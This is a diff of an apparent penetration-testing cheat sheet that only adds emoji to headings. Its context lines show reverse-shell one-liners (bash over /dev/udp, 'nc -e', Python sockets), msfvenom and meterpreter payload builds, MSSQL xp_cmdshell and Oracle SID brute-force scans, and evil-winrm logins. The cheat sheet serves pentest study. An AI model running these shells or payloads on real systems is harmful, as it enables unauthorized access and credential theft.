@@ -650,7 +650,7 @@ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-c
 </tr>
 </table>
 
-**MSSQL Ping in Metasploit**
+**💣 MSSQL Ping in Metasploit**
 
 <table width="100%">
 <tr>
@@ -721,7 +721,7 @@ python3 mssqlclient.py Administrator@<IP> -windows-auth
 </tr>
 </table>
 
-**Bash**
+**🐧 Bash**
 
 <table width="100%">
 <tr>
@@ -747,7 +747,7 @@ bash -i >& /dev/udp/<IP>/<PORT> 0>&1
 </tr>
 </table>
 
-**Netcat**
+**🔌 Netcat**
 
 <table width="100%">
 <tr>
@@ -770,7 +770,7 @@ nc -e /bin/sh <IP> <PORT>
 </tr>
 </table>
 
-**Python**
+**🐍 Python**
 
 <table width="100%">
 <tr>
@@ -793,7 +793,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 </tr>
 </table>
 
-**Metasploit Payloads**
+**💣 Metasploit Payloads**
 
 <table width="100%">
 <tr>
@@ -819,7 +819,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x
 </tr>
 </table>
 
-**Meterpreter Payloads**
+**💀 Meterpreter Payloads**
 
 <table width="100%">
 <tr>
@@ -845,7 +845,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > s
 </tr>
 </table>
 
-**Spawn TTY**
+**🖥️ Spawn TTY**
 
 <table width="100%">
 <tr>
@@ -949,7 +949,7 @@ ssh -i id_rsa <USER>@<ip>
 </tr>
 </table>
 
-**Port Forwarding**
+**🔀 Port Forwarding**
 
 <table width="100%">
 <tr>
@@ -1003,11 +1003,11 @@ sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
 </tr>
 </table>
 
-**Oracle-Tools**
+**🔧 Oracle-Tools**
 
 See the setup script for installing Oracle tools: [`Oracle-Tools-setup.sh`](../scripts/footprinting/Oracle-Tools-setup.sh)
 
-**Testing ODAT**
+**🧪 Testing ODAT**
 
 <table width="100%">
 <tr>
@@ -1180,7 +1180,7 @@ run
 </tr>
 </table>
 
-**Dump Hashes**
+**🔓 Dump Hashes**
 
 <table width="100%">
 <tr>
@@ -1257,7 +1257,7 @@ nmap -sV -sC -n <IP> -p3389 --disable-arp-ping --script rdp*
 </tr>
 </table>
 
-**RDP Security Check**
+**🔍 RDP Security Check**
 
 📦 **Installation:** See [RDP-Sec-Check](../TOOLS.md#rdp-sec-check) in the Tools Guide.
 
@@ -1311,7 +1311,7 @@ xfreerdp /u:<USER> /p:"<PASSWORD>" /v:<IP>
 <details>
 <summary><h2>🔗 Windows Remote Management Protocols</h2></summary>
 
-**WinRM**
+**🪟 WinRM**
 
 Scan with Nmap:
 
@@ -1359,7 +1359,7 @@ evil-winrm -i <IP> -u <USER> -p <PASSWORD>
 </tr>
 </table>
 
-**Windows Management Instrumentation (WMI)**
+**⚙️ Windows Management Instrumentation (WMI)**
 
 Footprinting the service:
 
